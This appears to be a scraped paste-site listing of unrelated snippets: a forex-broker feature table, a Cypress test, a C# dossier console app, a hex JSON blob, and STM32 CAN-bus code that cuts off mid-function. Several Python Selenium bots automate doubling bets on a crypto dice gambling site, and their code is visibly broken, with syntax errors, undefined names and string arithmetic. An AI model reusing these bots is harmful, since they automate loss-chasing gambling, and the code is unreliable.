Free Demo AccountsYesMinimum Initial Deposit$25Multi-Currency AccountUSDSpreadsMin/FloatingStop Out Level45% - Islamic Account50% - Classic/ECN/Premium AccountIntroducing Brokers ProgramYesSwap FreeYes (Islamic)PromotionsYesCopy TradingYesTrading Platforms&nbsp;Mobile App, MetaTrader 5, cTraderScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoney
"
0QwsMpyA,cypress testing deep,deddyprianto,JavaScript,Monday 13th of May 2024 06:08:01 AM CDT,"  cy.get(""div#groupingSearchItem"")
      .first()
      .then(($element) => {
        const objHtml = $element[0];
        const nameGroupItemSearchElement = objHtml.querySelector(
          ""#nameGroupItemSearch"",
        );
        const buttonAdd = objHtml.querySelector(""button.justify-center"");
        cy.get(buttonAdd).should(""be.visible"").click();
        cy.get(nameGroupItemSearchElement).contains(""Western"");
      });"
d9b4v23m,personal accounting,SaNik74,C#,Monday 13th of May 2024 06:03:56 AM CDT,"namespace personal_accounting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string AddNewDossierCommand = ""add dossier"";
            const string OutputDossierCommand = ""output all dossier"";
            const string FindLastNameCommand = ""find"";
            const string DeleteDossierCommand = ""delete"";
            const string ExitCommand = ""exit"";

            bool isWorking = true;
            string[] fullNames = new string[0];
            string[] jobTitles = new string[0];

            while (isWorking)
            {
                Console.WriteLine($""База данных:"" +
            $""\nДля добавления досье введите - {AddNewDossierCommand}."" +
            $""\nДля вывода всей базы введите - {OutputDossierCommand}."" +
            $""\nДля удаления досье введите - {DeleteDossierCommand}."" +
            $""\nДля поиска по фамилии введите - {FindLastNameCommand}."" +
            $""\nДля выхода введите - {ExitCommand}."");

                string? userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddNewDossierCommand:
                        AddDossier(ref fullNames, ref jobTitles);
                        break;

                    case OutputDossierCommand:
                        OutputAllDossier(fullNames, jobTitles);
                        break;

                    case DeleteDossierCommand:
                        DeleteDossier(ref fullNames, ref jobTitles);
                        break;

                    case FindLastNameCommand:
                        FindLastName(fullNames, jobTitles);
                        break;

                    case ExitCommand:
                        isWorking = false;
                        break;

                    default:
                        DisplayUncorrectMessage();
                        break;
                }

                Console.Clear();
            }
        }

        static string[] AddData(string[] array, string data)
        {
            string[] tempArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                tempArray[i] = array[i];
            }

            Console.Write($""Введите {data}: "");
            string? name = Console.ReadLine();
            tempArray[array.Length] = name;
            array = tempArray;
            return array;
        }

        static void AddDossier(ref string[] fullNames, ref string[] jobTitles)
        {
            string fullName = ""ФИО"";
            string jobTitle = ""должность"";

            fullNames = AddData(fullNames, fullName);
            jobTitles = AddData(jobTitles, jobTitle);
        }

        static void OutputAllDossier(string[] fullNames, string[] jobTitles)
        {
            if (fullNames.Length == 0)
            {
                Console.WriteLine(""Массив пуст."");
                Console.ReadKey();
            }
            else
            {
                for (int i = 0; i < fullNames.Length - 1; i++)
                {
                    int serialNumber = i + 1;

                    Console.Write($""{serialNumber} {fullNames[i]} {jobTitles[i]} - "");
                }

                Console.Write($""{fullNames.Length} {fullNames[fullNames.Length - 1]} {jobTitles[jobTitles.Length - 1]}."");

                Console.ReadKey();
            }
        }

        static string[] DeleteData(string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index; i++)
            {
                tempArray[i] = array[i];
            }

            for (int i = index + 1; i < array.Length; i++)
            {
                tempArray[i - 1] = array[i];
            }

            array = tempArray;
            return array;
        }

        static int TryGetNumber()
        {
            bool isWorking = true;
            int number = 0;

            bool isNumber = int.TryParse(Console.ReadLine(), out int result);

            if (isNumber)
            {
                number = result - 1;
                isWorking = false;
            }
            else
            {
                Console.WriteLine(""Необходимо ввести число."");
                Console.ReadKey();
            }

            return number;
        }

        static void DeleteDossier(ref string[] fullNames, ref string[] jobTitles)
        {
            Console.Write(""Введите номер досье, которое хотите удалить: "");

            int number = TryGetNumber();

            if (number > fullNames.Length || number < 0)
            {
                Console.WriteLine(""Число вышло за пределы массива."");
                Console.ReadKey();
            }
            else if (fullNames.Length == 0)
            {
                Console.WriteLine(""Массив пуст."");
                Console.ReadKey();
            }
            else
            {
                fullNames = DeleteData(fullNames, number);
                jobTitles = DeleteData(jobTitles, number);
            }
        }

        static void FindLastName(string[] fullNames, string[] jobTitles)
        {
            if (fullNames.Length == 0)
            {
                Console.WriteLine(""Массив пуст."");
                Console.ReadKey();
                return;
            }

            Console.Write(""Введите фамилию: "");
            string? lastName = Console.ReadLine();

            for (int i = 0; i < fullNames.Length; i++)
            {
                int serialNumber = i + 1;

                if (fullNames[i].Split()[0] == lastName)
                {
                    Console.WriteLine($""{serialNumber} {fullNames[i]} {jobTitles[i]}"");
                    Console.ReadKey();
                    return;
                }
            }

            Console.WriteLine($""Досье с фамилией {lastName} не найдено."");
            Console.ReadKey();
        }

        static void DisplayUncorrectMessage()
        {
            Console.WriteLine(""Введена некорректная команда. Попробуйте еще раз."");
            Console.ReadKey();
        }
    }
}
"
1bFDxFJ3,data925,TestGuy1,JSON,Monday 13th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'fde2915ef4dfe4fdc1a37e18306e7c06385e443dc1330bf99195dd5d64fd1b540effde59ff04c032151fc946d004948d1ffe2dc38ea65c3580dde6c19d3016403e558a68c9584fcd93d4a01de6abd3ee6423e4ebb0398b6eda84127384138f72448fe4cccff0b6b4c887d04cdf56832f07b0ca191697ae9d6b2b4f626571072e',
  otherdata: [
    'e3391a3e7683ccc618beb2bf0096586b',
    '0e574a33fc54f7fd04239b5740ec490e',
    '7d8f514eece872aa9d948f1d903b72ca',
    '2cc6c3c88216b4300456929dceec5faf',
    '0dc6968fcdc372931dd8560f03f7212a',
    'c01fd121e33ac59cc4136fd347df8255',
    '5b3eef5e8bdf04249f0a3c623e8b21d4',
    '9b1c0213c9770066f7d1c42f116eedd1'
  ]
}"
pdZyKvMQ,use in google colab python snowybot,coinwalk,Python,Monday 13th of May 2024 05:58:54 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = ((float(belance))/240)
fart = 1
base = ((float(belance))/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if if ((float(balance))>=((float(belance))*4)):
        exit()
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
w8wMkHZe,snowybot trial python,coinwalk,Python,Monday 13th of May 2024 05:45:34 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/240)
fart = 1
base = (belance/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((float(balance))>=(belance*4)):
        exit()
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
8Q1rjwWy,snowybot python,coinwalk,Python,Monday 13th of May 2024 05:40:25 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/240)
fart = 1
base = (belance/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
E3CSuYrH,trial,coinwalk,JavaScript,Monday 13th of May 2024 05:32:29 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import json
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
sys.setrecursionlimit(1000000000)
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/2400)
fart = 1
base = (belance/2400)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
xBBTmCHi,Enelion Stylo Energy Guard,josefkyrian,C++,Monday 13th of May 2024 05:24:07 AM CDT,"#include <assert.h>

/******************************************************************************
************************ CANBUS FUNCTIONS START *******************************
******************************************************************************/ 
#define STM32_CAN_TIR_TXRQ              (1U << 0U)  // Bit 0: Transmit Mailbox Request
#define STM32_CAN_RIR_RTR               (1U << 1U)  // Bit 1: Remote Transmission Request
#define STM32_CAN_RIR_IDE               (1U << 2U)  // Bit 2: Identifier Extension
#define STM32_CAN_TIR_RTR               (1U << 1U)  // Bit 1: Remote Transmission Request
#define STM32_CAN_TIR_IDE               (1U << 2U)  // Bit 2: Identifier Extension

#define CAN_EXT_ID_MASK                 0x1FFFFFFFU
#define CAN_STD_ID_MASK                 0x000007FFU

/* Symbolic names for formats of CAN message                                 */
typedef enum {STANDARD_FORMAT = 0, EXTENDED_FORMAT} CAN_FORMAT;

/* Symbolic names for type of CAN message                                    */
typedef enum {DATA_FRAME = 0, REMOTE_FRAME}         CAN_FRAME;


typedef struct
{
	uint32_t id;        /* 29 bit identifier                               */
	uint8_t  data[8];   /* Data field                                      */
	uint8_t  len;       /* Length of data field in bytes                   */
	uint8_t  ch;        /* Object channel(Not use)                         */
	uint8_t  format;    /* 0 - STANDARD, 1- EXTENDED IDENTIFIER            */
	uint8_t  type;      /* 0 - DATA FRAME, 1 - REMOTE FRAME                */
} CAN_msg_t;

typedef struct
{
		uint16_t baud_rate_prescaler;                /// [1 to 1024]
		uint8_t time_segment_1;                      /// [1 to 16]
		uint8_t time_segment_2;                      /// [1 to 8]
		uint8_t resynchronization_jump_width;        /// [1 to 4] (recommended value is 1)
} CAN_bit_timing_config_t;


/**
 * Initializes the CAN filter registers.
 *
 * @preconditions   - This register can be written only when the filter initialization mode is set (FINIT=1) in the CAN_FMR register.
 * @params: index   - Specified filter index. index 27:14 are available in connectivity line devices only.
 * @params: scale   - Select filter scale.
 *                    0: Dual 16-bit scale configuration
 *                    1: Single 32-bit scale configuration
 * @params: mode    - Select filter mode.
 *                    0: Two 32-bit registers of filter bank x are in Identifier Mask mode
 *                    1: Two 32-bit registers of filter bank x are in Identifier List mode
 * @params: fifo    - Select filter assigned.
 *                    0: Filter assigned to FIFO 0
 *                    1: Filter assigned to FIFO 1
 * @params: bank1   - Filter bank register 1
 * @params: bank2   - Filter bank register 2
 *
 */
void CANSetFilter(uint8_t index, uint8_t scale, uint8_t mode, uint8_t fifo, uint32_t bank1, uint32_t bank2) {
	if (index > 27) return;

	CAN1->FA1R &= ~(0x1UL<<index);               // Deactivate filter

	if (scale == 0) {
		CAN1->FS1R &= ~(0x1UL<<index);             // Set filter to Dual 16-bit scale configuration
	} else {
		CAN1->FS1R |= (0x1UL<<index);              // Set filter to single 32 bit configuration
	}
		if (mode == 0) {
		CAN1->FM1R &= ~(0x1UL<<index);             // Set filter to Mask mode
	} else {
		CAN1->FM1R |= (0x1UL<<index);              // Set filter to List mode
	}

	if (fifo == 0) {
		CAN1->FFA1R &= ~(0x1UL<<index);            // Set filter assigned to FIFO 0
	} else {
		CAN1->FFA1R |= (0x1UL<<index);             // Set filter assigned to FIFO 1
	}

	CAN1->sFilterRegister[index].FR1 = bank1;    // Set filter bank registers1
	CAN1->sFilterRegister[index].FR2 = bank2;    // Set filter bank registers2

	CAN1->FA1R |= (0x1UL<<index);                // Activate filter

}

/**
 * Initializes the CAN controller with specified bit rate.
 *
 * @params: timings - Specified timings
 * @params: remap   - Select CAN port. 
 *                    =0:CAN_RX mapped to PA11, CAN_TX mapped to PA12
 *                    =1:Not used
 *                    =2:CAN_RX mapped to PB8, CAN_TX mapped to PB9 (not available on 36-pin package)
 *                    =3:CAN_RX mapped to PD0, CAN_TX mapped to PD1 (available on 100-pin and 144-pin package)
 *
 */
bool CANInit(CAN_bit_timing_config_t &timings, int remap)
{
	// Reference manual
	// https://www.st.com/content/ccc/resource/technical/document/reference_manual/59/b9/ba/7f/11/af/43/d5/CD00171190.pdf/files/CD00171190.pdf/jcr:content/translations/en.CD00171190.pdf

	RCC->APB1ENR |= 0x2000000UL;       // Enable CAN clock 
	RCC->APB2ENR |= 0x1UL;             // Enable AFIO clock
	AFIO->MAPR   &= 0xFFFF9FFF;        // reset CAN remap
																		// CAN_RX mapped to PA11, CAN_TX mapped to PA12

	if (remap == 0) {
		RCC->APB2ENR |= 0x4UL;           // Enable GPIOA clock
		GPIOA->CRH   &= ~(0xFF000UL);    // Configure PA12(0b0000) and PA11(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOA->CRH   |= 0xB8FFFUL;       // Configure PA12(0b1011) and PA11(0b1000)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		
		GPIOA->ODR |= 0x1UL << 12;       // PA12 Upll-up
		
	}
																
	if (remap == 2) {
		AFIO->MAPR   |= 0x00004000;      // set CAN remap
																		// CAN_RX mapped to PB8, CAN_TX mapped to PB9 (not available on 36-pin package)

		RCC->APB2ENR |= 0x8UL;           // Enable GPIOB clock
		GPIOB->CRH   &= ~(0xFFUL);       // Configure PB9(0b0000) and PB8(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOB->CRH   |= 0xB8UL;          // Configure PB9(0b1011) and PB8(0b1000)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		
		GPIOB->ODR |= 0x1UL << 8;        // PB8 Upll-up
	}
	
	if (remap == 3) {
		AFIO->MAPR   |= 0x00005000;      // set CAN remap
																		// CAN_RX mapped to PD0, CAN_TX mapped to PD1 (available on 100-pin and 144-pin package)

		RCC->APB2ENR |= 0x20UL;          // Enable GPIOD clock
		GPIOD->CRL   &= ~(0xFFUL);       // Configure PD1(0b0000) and PD0(0b0000)
																		// 0b0000
																		//   MODE=00(Input mode)
																		//   CNF=00(Analog mode)

		GPIOD->CRH   |= 0xB8UL;          // Configure PD1(0b1011) and PD0(0b1000)
																		// 0b1000
																		//   MODE=00(Input mode)
																		//   CNF=10(Input with pull-up / pull-down)
																		// 0b1011
																		//   MODE=11(Output mode, max speed 50 MHz) 
																		//   CNF=10(Alternate function output Push-pull
																		
		GPIOD->ODR |= 0x1UL << 0;        // PD0 Upll-up
	}

	CAN1->MCR |= 0x1UL;                   // Require CAN1 to Initialization mode 
	while (!(CAN1->MSR & 0x1UL));         // Wait for Initialization mode

	//CAN1->MCR = 0x51UL;                 // Hardware initialization(No automatic retransmission)
	CAN1->MCR = 0x41UL;                   // Hardware initialization(With automatic retransmission)
	
	// Set bit timing register 
	CAN1->BTR = (((timings.resynchronization_jump_width - 1U) &    3U) << 24U) |
							(((timings.time_segment_1 - 1U)               &   15U) << 16U) |
							(((timings.time_segment_2 - 1U)               &    7U) << 20U) |
							((timings.baud_rate_prescaler - 1U)           & 1023U);

	// Configure Filters to default values
	CAN1->FMR  |=   0x1UL;                // Set to filter initialization mode
	CAN1->FMR  &= 0xFFFFC0FF;             // Clear CAN2 start bank

	// bxCAN has 28 filters.
	// These filters are shared by both CAN1 and CAN2.
	// STM32F103 has only CAN1, so all 28 are used for CAN1
	CAN1->FMR  |= 0x1C << 8;              // Assign all filters to CAN1

	// Set fileter 0
	// Single 32-bit scale configuration 
	// Two 32-bit registers of filter bank x are in Identifier Mask mode
	// Filter assigned to FIFO 0 
	// Filter bank register to all 0
	CANSetFilter(0, 1, 0, 0, 0x0UL, 0x0UL); 
	
	CAN1->FMR   &= ~(0x1UL);              // Deactivate initialization mode

	uint16_t TimeoutMilliseconds = 1000;
	bool can1 = false;
	CAN1->MCR   &= ~(0x1UL);              // Require CAN1 to normal mode 

	// Wait for normal mode
	// If the connection is not correct, it will not return to normal mode.
	for (uint16_t wait_ack = 0; wait_ack < TimeoutMilliseconds; wait_ack++) {
		if ((CAN1->MSR & 0x1UL) == 0) {
			can1 = true;
			break;
		}
		delayMicroseconds(1000);
	}
	//Serial.print(""can1="");
	//Serial.println(can1);
	if (can1) {
		Serial.println(""CAN1 initialize ok"");
	} else {
		Serial.println(""CAN1 initialize fail!!"");
		return false;
	}
	return true; 
}

/**
 * Decodes CAN messages from the data registers and populates a 
 * CAN message struct with the data fields.
 * 
 * @preconditions A valid CAN message is received
 * @params CAN_rx_msg - CAN message structure for reception
 * 
 */
void CANReceive(CAN_msg_t* CAN_rx_msg)
{
	uint32_t id = CAN1->sFIFOMailBox[0].RIR;
